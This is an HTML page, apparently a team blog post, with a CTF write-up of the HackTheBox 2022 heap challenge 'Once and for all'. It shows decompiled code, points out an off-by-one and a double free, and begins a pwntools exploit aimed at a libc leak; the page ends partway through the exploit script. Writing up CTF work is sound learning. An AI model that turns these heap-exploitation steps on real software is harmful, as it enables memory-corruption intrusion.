@@ -1,0 +1,803 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>[HackTheBox Cyber Apocalypse 2022 - pwn] Once and for all // ret2school</title>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.92.2" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="nasm" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://ret2school.github.io/css/main.min.88e7083eff65effb7485b6e6f38d10afbec25093a6fac42d734ce9024d3defbd.css" />
+
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-8K5XT0SJN8"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-8K5XT0SJN8', { 'anonymize_ip': false });
+}
+</script>
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="[HackTheBox Cyber Apocalypse 2022 - pwn] Once and for all"/>
+<meta name="twitter:description" content="Once for all is a heap challenge I did during the HackTheBox Cyber Apocalypse event. This is a classic unsorted bin attack plus a FSOP on stdin. Find the tasks and the final exploit here and here.
+Reverse engineering All the snippets of pseudo-code are issued by IDA freeware:
+int __cdecl main(int argc, const char **argv, const char **envp) { int v4; // [rsp&#43;18h] [rbp-8h] BYREF  int i; // [rsp&#43;1Ch] [rbp-4h]  for ( i = 0; i &lt;= 49; &#43;&#43;i ) { puts(s); printf(&amp;unk_1310); __isoc99_scanf(&amp;unk_13C8, &amp;v4); puts(s); switch ( v4 ) { case 1: small_alloc(s); break; case 2: fix(s); break; case 3: examine(s); break; case 4: savebig(s); break; case 5: exit(0); default: puts(&#34;[-] Invalid choice!"/>
+
+    <meta property="og:title" content="[HackTheBox Cyber Apocalypse 2022 - pwn] Once and for all" />
+<meta property="og:description" content="Once for all is a heap challenge I did during the HackTheBox Cyber Apocalypse event. This is a classic unsorted bin attack plus a FSOP on stdin. Find the tasks and the final exploit here and here.
+Reverse engineering All the snippets of pseudo-code are issued by IDA freeware:
+int __cdecl main(int argc, const char **argv, const char **envp) { int v4; // [rsp&#43;18h] [rbp-8h] BYREF  int i; // [rsp&#43;1Ch] [rbp-4h]  for ( i = 0; i &lt;= 49; &#43;&#43;i ) { puts(s); printf(&amp;unk_1310); __isoc99_scanf(&amp;unk_13C8, &amp;v4); puts(s); switch ( v4 ) { case 1: small_alloc(s); break; case 2: fix(s); break; case 3: examine(s); break; case 4: savebig(s); break; case 5: exit(0); default: puts(&#34;[-] Invalid choice!" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://ret2school.github.io/post/onceandforall/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2022-05-19T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-05-19T00:00:00+00:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://ret2school.github.io"><img class="app-header-avatar" src="/pic.jpeg" alt="nasm" /></a>
+      <h1>ret2school</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             / 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+      </nav>
+      <p>Just a bunch of french ctf players</p>
+      <div class="app-header-social">
+        
+          <a target="_blank" href="https://github.com/ret2school" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg></a>
+        
+          <a target="_blank" href="https://twitter.com/ret2school_fr" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg></a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">[HackTheBox Cyber Apocalypse 2022 - pwn] Once and for all</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          May 19, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          16 min read
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line>
+</svg>
+              <a class="tag" href="https://ret2school.github.io/tags/ctf/">ctf</a>
+              <a class="tag" href="https://ret2school.github.io/tags/hackthebox/">HackTheBox</a>
+              <a class="tag" href="https://ret2school.github.io/tags/nasm/">nasm</a>
+              <a class="tag" href="https://ret2school.github.io/tags/pwn/">pwn</a>
+              <a class="tag" href="https://ret2school.github.io/tags/fsop/">FSOP</a>
+              <a class="tag" href="https://ret2school.github.io/tags/heap/">heap</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <p>Once for all is a heap challenge I did during the HackTheBox Cyber Apocalypse event. This is a classic unsorted bin attack plus a FSOP on stdin.
+Find the tasks and the final exploit <a href="https://github.com/ret2school/ctf/blob/master/2022/apocalypse/onceAndmore/">here</a> and <a href="https://github.com/ret2school/ctf/blob/master/2022/apocalypse/onceAndmore/exploit.py">here</a>.</p>
+<h1 id="reverse-engineering">Reverse engineering</h1>
+<p>All the snippets of pseudo-code are issued by <a href="https://hex-rays.com/ida-free/">IDA freeware</a>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#8be9fd">int</span> <span style="color:#ff79c6">__cdecl</span> <span style="color:#50fa7b">main</span>(<span style="color:#8be9fd">int</span> argc, <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">**</span>argv, <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">**</span>envp)
+{
+  <span style="color:#8be9fd">int</span> v4; <span style="color:#6272a4">// [rsp+18h] [rbp-8h] BYREF
+</span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">int</span> i; <span style="color:#6272a4">// [rsp+1Ch] [rbp-4h]
+</span><span style="color:#6272a4"></span>
+  <span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">49</span>; <span style="color:#ff79c6">++</span>i )
+  {
+    puts(s);
+    printf(<span style="color:#ff79c6">&amp;</span>unk_1310);
+    __isoc99_scanf(<span style="color:#ff79c6">&amp;</span>unk_13C8, <span style="color:#ff79c6">&amp;</span>v4);
+    puts(s);
+    <span style="color:#ff79c6">switch</span> ( v4 )
+    {
+      <span style="color:#ff79c6">case</span> <span style="color:#bd93f9">1</span><span style="color:#ff79c6">:</span>
+        small_alloc(s);
+        <span style="color:#ff79c6">break</span>;
+      <span style="color:#ff79c6">case</span> <span style="color:#bd93f9">2</span><span style="color:#ff79c6">:</span>
+        fix(s);
+        <span style="color:#ff79c6">break</span>;
+      <span style="color:#ff79c6">case</span> <span style="color:#bd93f9">3</span><span style="color:#ff79c6">:</span>
+        examine(s);
+        <span style="color:#ff79c6">break</span>;
+      <span style="color:#ff79c6">case</span> <span style="color:#bd93f9">4</span><span style="color:#ff79c6">:</span>
+        savebig(s);
+        <span style="color:#ff79c6">break</span>;
+      <span style="color:#ff79c6">case</span> <span style="color:#bd93f9">5</span><span style="color:#ff79c6">:</span>
+        exit(<span style="color:#bd93f9">0</span>);
+      <span style="color:#ff79c6">default</span><span style="color:#ff79c6">:</span>
+        puts(<span style="color:#f1fa8c">&#34;[-] Invalid choice!&#34;</span>);
+        <span style="color:#ff79c6">break</span>;
+    }
+  }
+  <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
+}
+</code></pre></div><p>The binary allows you to allocate a small chunk beetween <code>0x1f</code> and <code>0x38</code> bytes:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">small_alloc</span>()
+{
+  <span style="color:#ff79c6">__int64</span> v1; <span style="color:#6272a4">// rbx
+</span><span style="color:#6272a4"></span>  size_t nmemb; <span style="color:#6272a4">// [rsp+0h] [rbp-20h] BYREF
+</span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">__int64</span> idx[<span style="color:#bd93f9">3</span>]; <span style="color:#6272a4">// [rsp+8h] [rbp-18h] BYREF
+</span><span style="color:#6272a4"></span>
+  <span style="color:#ff79c6">if</span> ( allocated <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">15</span> )
+    <span style="color:#ff79c6">return</span> puts(<span style="color:#f1fa8c">&#34;Nothing more!&#34;</span>);
+  <span style="color:#ff79c6">++</span>allocated;
+  printf(<span style="color:#f1fa8c">&#34;Choose an index: &#34;</span>);
+  __isoc99_scanf(<span style="color:#f1fa8c">&#34;%lu&#34;</span>, idx);
+  <span style="color:#ff79c6">if</span> ( size_array[<span style="color:#bd93f9">2</span> <span style="color:#ff79c6">*</span> idx[<span style="color:#bd93f9">0</span>]] <span style="color:#ff79c6">||</span> (<span style="color:#ff79c6">&amp;</span>alloc_array)[<span style="color:#bd93f9">2</span> <span style="color:#ff79c6">*</span> idx[<span style="color:#bd93f9">0</span>]] <span style="color:#ff79c6">||</span> idx[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">0xEuLL</span> )
+    <span style="color:#ff79c6">return</span> puts(<span style="color:#f1fa8c">&#34;[-] Invalid!&#34;</span>);
+  printf(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">How much space do you need for it: &#34;</span>);
+  __isoc99_scanf(<span style="color:#f1fa8c">&#34;%lu&#34;</span>, <span style="color:#ff79c6">&amp;</span>nmemb);
+  <span style="color:#ff79c6">if</span> ( nmemb <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">0x1F</span> <span style="color:#ff79c6">||</span> nmemb <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">0x38</span> )
+    <span style="color:#ff79c6">return</span> puts(<span style="color:#f1fa8c">&#34;[-] Your inventory cannot provide this type of space!&#34;</span>);
+  size_array[<span style="color:#bd93f9">2</span> <span style="color:#ff79c6">*</span> idx[<span style="color:#bd93f9">0</span>]] <span style="color:#ff79c6">=</span> nmemb;
+  v1 <span style="color:#ff79c6">=</span> idx[<span style="color:#bd93f9">0</span>];
+  (<span style="color:#ff79c6">&amp;</span>alloc_array)[<span style="color:#bd93f9">2</span> <span style="color:#ff79c6">*</span> v1] <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">void</span> <span style="color:#ff79c6">**</span>)calloc(nmemb, <span style="color:#bd93f9">1uLL</span>);
+  <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>(<span style="color:#ff79c6">&amp;</span>alloc_array)[<span style="color:#bd93f9">2</span> <span style="color:#ff79c6">*</span> idx[<span style="color:#bd93f9">0</span>]] )
+  {
+    puts(<span style="color:#f1fa8c">&#34;[-] Something didn&#39;t work out...&#34;</span>);
+    exit(<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>);
+  }
+  puts(<span style="color:#f1fa8c">&#34;Input your weapon&#39;s details: &#34;</span>);
+  
+  <span style="color:#ff79c6"># off-by-one
+</span><span style="color:#ff79c6"></span>  <span style="color:#ff79c6">return</span> read(<span style="color:#bd93f9">0</span>, (<span style="color:#ff79c6">&amp;</span>alloc_array)[<span style="color:#bd93f9">2</span> <span style="color:#ff79c6">*</span> idx[<span style="color:#bd93f9">0</span>]], nmemb <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>);
+}
+</code></pre></div><p>As you can see right above this function contains an off-by-one vulnerability, which means we can write only one byte right after the allocated chunk, overlapping the size field of the next chunk / top chunk.</p>
+<p>The fix function frees a chunk and asks for another size, then it allocates another chunk with <code>calloc</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">fix</span>()
+{
+  <span style="color:#8be9fd">int</span> result; <span style="color:#6272a4">// eax
+</span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> v1; <span style="color:#6272a4">// rbx
+</span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> idx; <span style="color:#6272a4">// [rsp+8h] [rbp-28h] BYREF
+</span><span style="color:#6272a4"></span>  size_t size; <span style="color:#6272a4">// [rsp+10h] [rbp-20h] BYREF
+</span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">__int64</span> v4[<span style="color:#bd93f9">3</span>]; <span style="color:#6272a4">// [rsp+18h] [rbp-18h] BYREF
+</span><span style="color:#6272a4"></span>
+  printf(<span style="color:#f1fa8c">&#34;Choose an index: &#34;</span>);
+  __isoc99_scanf(<span style="color:#f1fa8c">&#34;%lu&#34;</span>, <span style="color:#ff79c6">&amp;</span>idx);
+  <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>size_array[<span style="color:#bd93f9">2</span> <span style="color:#ff79c6">*</span> idx] <span style="color:#ff79c6">||</span> <span style="color:#ff79c6">!</span>alloc_array[<span style="color:#bd93f9">2</span> <span style="color:#ff79c6">*</span> idx] <span style="color:#ff79c6">||</span> idx <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">0xE</span> )
+    <span style="color:#ff79c6">return</span> puts(<span style="color:#f1fa8c">&#34;[-] Invalid!&#34;</span>);
+  puts(<span style="color:#f1fa8c">&#34;Ok, let&#39;s get you some new parts for this one... seems like it&#39;s broken&#34;</span>);
+  free(alloc_array[<span style="color:#bd93f9">2</span> <span style="color:#ff79c6">*</span> idx]);
+  printf(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">How much space do you need for this repair: &#34;</span>);
+  __isoc99_scanf(<span style="color:#f1fa8c">&#34;%lu&#34;</span>, <span style="color:#ff79c6">&amp;</span>size);
+  <span style="color:#ff79c6">if</span> ( size <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">0x1F</span> <span style="color:#ff79c6">||</span> size <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">0x38</span> )
+    <span style="color:#ff79c6"># [1] 
+</span><span style="color:#ff79c6"></span>    <span style="color:#ff79c6">return</span> puts(<span style="color:#f1fa8c">&#34;[-] Your inventory cannot provide this type of space.&#34;</span>);
+  size_array[<span style="color:#bd93f9">2</span> <span style="color:#ff79c6">*</span> idx] <span style="color:#ff79c6">=</span> size;
+  v1 <span style="color:#ff79c6">=</span> idx;
+  alloc_array[<span style="color:#bd93f9">2</span> <span style="color:#ff79c6">*</span> v1] <span style="color:#ff79c6">=</span> calloc(size, <span style="color:#bd93f9">1uLL</span>);
+  <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>alloc_array[<span style="color:#bd93f9">2</span> <span style="color:#ff79c6">*</span> idx] )
+  {
+    puts(<span style="color:#f1fa8c">&#34;Something didn&#39;t work out...&#34;</span>);
+    exit(<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>);
+  }
+  puts(<span style="color:#f1fa8c">&#34;Input your weapon&#39;s details: &#34;</span>);
+  read(<span style="color:#bd93f9">0</span>, alloc_array[<span style="color:#bd93f9">2</span> <span style="color:#ff79c6">*</span> idx], size);
+  printf(<span style="color:#f1fa8c">&#34;What would you like to do now?</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">1. Verify weapon</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">2. Continue</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&gt;&gt; &#34;</span>);
+  __isoc99_scanf(<span style="color:#f1fa8c">&#34;%lu&#34;</span>, v4);
+  result <span style="color:#ff79c6">=</span> v4[<span style="color:#bd93f9">0</span>];
+  <span style="color:#ff79c6">if</span> ( v4[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">1</span> )
+  {
+    <span style="color:#ff79c6">if</span> ( verified )
+    {
+      <span style="color:#ff79c6">return</span> puts(<span style="color:#ff79c6">&amp;</span>unk_1648);
+    }
+    <span style="color:#ff79c6">else</span>
+    {
+      result <span style="color:#ff79c6">=</span> puts((<span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>)alloc_array[<span style="color:#bd93f9">2</span> <span style="color:#ff79c6">*</span> idx]);
+      verified <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>;
+    }
+  }
+  <span style="color:#ff79c6">return</span> result;
+}
+</code></pre></div><p>If we reach <code>[1]</code>, <code>alloc_array[2 * idx]</code> is freed leading to a double free.</p>
+<p>We can print a chunk only one time:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">examine</span>()
+{
+  <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> v1; <span style="color:#6272a4">// [rsp+8h] [rbp-8h] BYREF
+</span><span style="color:#6272a4"></span>
+  <span style="color:#ff79c6">if</span> ( examined )
+    <span style="color:#ff79c6">return</span> puts(<span style="color:#ff79c6">&amp;</span>unk_14D0);
+  examined <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>;
+  printf(<span style="color:#f1fa8c">&#34;Choose an index: &#34;</span>);
+  __isoc99_scanf(<span style="color:#f1fa8c">&#34;%lu&#34;</span>, <span style="color:#ff79c6">&amp;</span>v1);
+  <span style="color:#ff79c6">if</span> ( size_array[<span style="color:#bd93f9">2</span> <span style="color:#ff79c6">*</span> v1] <span style="color:#ff79c6">&amp;&amp;</span> alloc_array[<span style="color:#bd93f9">2</span> <span style="color:#ff79c6">*</span> v1] <span style="color:#ff79c6">&amp;&amp;</span> v1 <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">0xE</span> )
+    <span style="color:#ff79c6">return</span> puts((<span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>)alloc_array[<span style="color:#bd93f9">2</span> <span style="color:#ff79c6">*</span> v1]);
+  <span style="color:#ff79c6">else</span>
+    <span style="color:#ff79c6">return</span> puts(<span style="color:#f1fa8c">&#34;[-] Invalid!&#34;</span>);
+}
+</code></pre></div><p>Finally we can malloc a huge chunk, but we cannot wriet anything within:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">savebig</span>()
+{
+  <span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>v0; <span style="color:#6272a4">// rax
+</span><span style="color:#6272a4"></span>  size_t size; <span style="color:#6272a4">// [rsp+8h] [rbp-8h] BYREF
+</span><span style="color:#6272a4"></span>
+  <span style="color:#ff79c6">if</span> ( chungus_weapon <span style="color:#ff79c6">||</span> qword_202068 )
+  {
+    LODWORD(v0) <span style="color:#ff79c6">=</span> puts(<span style="color:#ff79c6">&amp;</span>unk_16E8);
+  }
+  <span style="color:#ff79c6">else</span>
+  {
+    printf(<span style="color:#f1fa8c">&#34;How much space do you need for this massive weapon: &#34;</span>);
+    __isoc99_scanf(<span style="color:#f1fa8c">&#34;%lu&#34;</span>, <span style="color:#ff79c6">&amp;</span>size);
+    <span style="color:#ff79c6">if</span> ( (<span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int16</span>)size <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">0x5AFu</span> <span style="color:#ff79c6">&amp;&amp;</span> (<span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int16</span>)size <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">0xF5C0u</span> )
+    {
+      puts(<span style="color:#f1fa8c">&#34;Adding to your inventory..&#34;</span>);
+      chungus_weapon <span style="color:#ff79c6">=</span> size;
+      v0 <span style="color:#ff79c6">=</span> malloc(size);
+      qword_202068 <span style="color:#ff79c6">=</span> (<span style="color:#ff79c6">__int64</span>)v0;
+    }
+    <span style="color:#ff79c6">else</span>
+    {
+      LODWORD(v0) <span style="color:#ff79c6">=</span> puts(<span style="color:#f1fa8c">&#34;[-] This is not possible..&#34;</span>);
+    }
+  }
+  <span style="color:#ff79c6">return</span> (<span style="color:#8be9fd">int</span>)v0;
+}
+</code></pre></div><h1 id="exploitation">Exploitation</h1>
+<h2 id="what-we-have">What we have</h2>
+<ul>
+<li>An off-by-one when we create a new chunk</li>
+<li>Double free by calling <code>fix</code> and then providing an invalid size.</li>
+<li>Trivial read after free thanks to the double free.</li>
+</ul>
+<h2 id="restrictions">Restrictions</h2>
+<ul>
+<li>The program does not use <code>printf</code> with a format specifer, then we cannot do a <a href="https://maxwelldulin.com/BlogPost?post=3107454976">House of husk</a>.</li>
+<li>We can only allocate <code>15</code> chunks.</li>
+<li>All the allocations except the big one are made using <code>calloc</code>, even if it can be easily bypassed by adding the <code>IS_MAPPED</code> flag to the chunk header to avoid zero-ing.</li>
+<li>The libc version (<code>2.27</code>) mitigates a few techniques, especially the <a href="https://1ce0ear.github.io/2017/11/26/study-house-of-orange/">House of Orange</a> and introduces the <code>tcache</code>.</li>
+<li>Allocations have to fit in only two fastbins (<code>0x30</code> / <code>0x40</code>), which means we cannot get an arbitrary with a <code>fastbin dup</code> technique due to the size of most of interesting memory areas in the libc (<code>0x7f</code> =&gt; <code>0x70</code> fastbin against <code>0x30</code> / <code>0x40</code> in our case).</li>
+</ul>
+<h2 id="how-to-leak-libc-">How to leak libc ?</h2>
+<p>Partial overwrites are as far as I know very hard to get because of <code>calloc</code>. The first thing to do is to leak libc addresses to then target libc global variables / structures. The classic way to get a libc leak is to free a chunk that belongs to the unsorted bin and then print it. But as seen previously, we cannot allocate a large chunks that would end up in the unsorted bin. To do so we have to use the off-by-one bug to overwrite the next chunk&rsquo;s size field with a bigger one that would correspond to the unsorted bin (<code>&gt;= 0x90</code>). We can edit the size of the second chunk from <code>0x30</code> to <code>0xb0</code> by doing:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">add</span>(idx, size, data, hang<span style="color:#ff79c6">=</span><span style="color:#ff79c6">False</span>):
+    io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt;&gt; &#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;1&#34;</span>)
+    io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Choose an index: &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(idx)<span style="color:#ff79c6">.</span>encode())
+    io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;How much space do you need for it: &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(size)<span style="color:#ff79c6">.</span>encode())
+    <span style="color:#ff79c6">if</span> hang <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">True</span>:
+        <span style="color:#ff79c6">return</span>
+
+    io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Input your weapon&#39;s details: </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, data)
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">freexalloc</span>(idx, size, data, doubleFree<span style="color:#ff79c6">=</span><span style="color:#ff79c6">False</span>):
+    io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt;&gt; &#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;2&#34;</span>)
+    io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Choose an index: &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(idx)<span style="color:#ff79c6">.</span>encode())
+    io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;How much space do you need for this repair: &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(size)<span style="color:#ff79c6">.</span>encode())
+
+    <span style="color:#ff79c6">if</span> doubleFree:
+        <span style="color:#ff79c6">return</span>
+
+    io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Input your weapon&#39;s details: </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, data)
+    io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt;&gt; &#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;1&#34;</span>)
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">show</span>(idx):
+    io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt;&gt; &#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;3&#34;</span>)
+    io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Choose an index: &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(idx)<span style="color:#ff79c6">.</span>encode())
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">allochuge</span>(size):
+    io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt;&gt; &#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;4&#34;</span>)
+    io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;How much space do you need for this massive weapon: &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(size)<span style="color:#ff79c6">.</span>encode())
+
+<span style="color:#6272a4"># get libc leak</span>
+
+add(<span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">56</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;A&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">55</span>)
+add(<span style="color:#bd93f9">1</span>, <span style="color:#bd93f9">56</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;B&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">39</span>)
+add(<span style="color:#bd93f9">2</span>, <span style="color:#bd93f9">40</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;C&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">39</span>) <span style="color:#6272a4"># size</span>
+add(<span style="color:#bd93f9">4</span>, <span style="color:#bd93f9">56</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;D&#34;</span><span style="color:#ff79c6">*</span>(<span style="color:#bd93f9">0x10</span>))
